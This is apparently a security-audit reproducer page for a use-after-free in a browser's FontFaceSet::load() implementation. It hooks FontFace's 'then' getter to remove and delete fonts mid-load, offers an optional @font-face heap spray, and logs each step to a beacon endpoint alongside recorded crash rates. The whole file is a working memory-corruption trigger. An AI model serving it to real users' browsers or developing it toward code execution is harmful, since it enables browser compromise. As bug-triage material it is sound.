// Finding 12, issue #143: FontFaceSet::load() use-after-free on 14.10.
//
// Serve this file as the default page. It is the issue's v9 trigger, unchanged,
// with every step posted synchronously to /beacon/<tag> so the last beacon in the
// server log names the last step that ran. A config file at
// /corpus/ffset-config.json may set {"spray":N,"del":0|1,"rm":0|1,"layout":0|1,
// "reload":0|1}; without it the page runs the crashing shape once.
//
// Observed on 14.10 (46 attempts, one WebProcess):
//   remove + fonts.delete      5 attempts, 4 deaths, all at GETTER returning
//   remove, no fonts.delete    2 attempts, 1 death
//   no removal, fonts.delete  19 attempts, 0 deaths
//   remove + 1000-rule spray  20 attempts, 0 deaths (11 resolved, 9 pending)

document.write('<textarea id="log" readonly style="width:100%;height:300px"></textarea>');

(function () {
  var logEl = document.getElementById('log');
  var cfg = { spray: 0, del: 1, rm: 1, layout: 1, reload: 0 };
  try {
    var xc = new XMLHttpRequest();
    xc.open('GET', '/corpus/ffset-config.json', false);
    xc.send();
    var c = JSON.parse(xc.responseText);
    for (var k in cfg) if (c[k] !== undefined) cfg[k] = (k === 'spray') ? (c[k] | 0) : (c[k] ? 1 : 0);
  } catch (e) {}

  function syncLog(tag, msg) {
    var line = 'FFSET spray=' + cfg.spray + ' del=' + cfg.del + ' rm=' + cfg.rm +
               ' lay=' + cfg.layout + ' ' + tag + ' ' + msg;
    logEl.value += line + '\n';
    try {
      var x = new XMLHttpRequest();
      x.open('POST', '/beacon/' + tag, false);
      x.send(line);
    } catch (e) {}
  }

  var A = new FontFace('a', 'local(Helvetica)', { unicodeRange: 'U+0041' });
  document.fonts.add(A);
  void A.loaded;
  syncLog('ADD', 'FontFace a added');

  var fired = false;
  Object.defineProperty(FontFace.prototype, 'then', {
    configurable: true,
    get: function () {
      if (fired) return undefined;
      fired = true;
      syncLog('GETTER', 'enter');
      if (cfg.rm) {
        try {
          var st = document.getElementById('victim-style');
          if (st) { st.remove(); syncLog('GETTER', 'style-removed'); }
        } catch (e) { syncLog('GETTER', 'style-err ' + e); }
      }
      if (cfg.layout) {
        try { void document.body.offsetHeight; syncLog('GETTER', 'layout'); } catch (e) {}
      }
      if (cfg.del) {
        try { document.fonts.delete(this); syncLog('GETTER', 'delete'); } catch (e) {}
      }
      syncLog('GETTER', 'returning');
      return undefined;
    },
    set: function () {}
  });
  syncLog('HOOK', 'then hooked');

  var st2 = document.createElement('style');
  st2.id = 'victim-style';
  st2.textContent = '@font-face { font-family: x; src: local(Arial); unicode-range: U+0042; }';
  document.head.appendChild(st2);
  syncLog('VICTIM', 'style injected');

  if (cfg.spray > 0) {
    var rules = [];
    for (var i = 0; i < cfg.spray; i++) {
      rules.push('@font-face { font-family: s' + i + '; src: local(Arial); unicode-range: U+0043; }');
    }
    var sp = document.createElement('style');
    sp.textContent = rules.join('\n');
    document.head.appendChild(sp);
    void document.body.offsetHeight;
    syncLog('SPRAY', 'rules=' + cfg.spray);
  }

  syncLog('CALL', 'document.fonts.load');
  document.fonts.load('1em a, x', 'AB').then(
    function () { syncLog('RESOLVED', 'no crash'); },
    function (e) { syncLog('REJECTED', String(e)); }
  );
  syncLog('PROMISE', 'load returned');

  setTimeout(function () {
    syncLog('ALIVE', '1500ms');
    if (cfg.reload) setTimeout(function () { try { location.reload(); } catch (e) {} }, 700);
  }, 1500);
})();
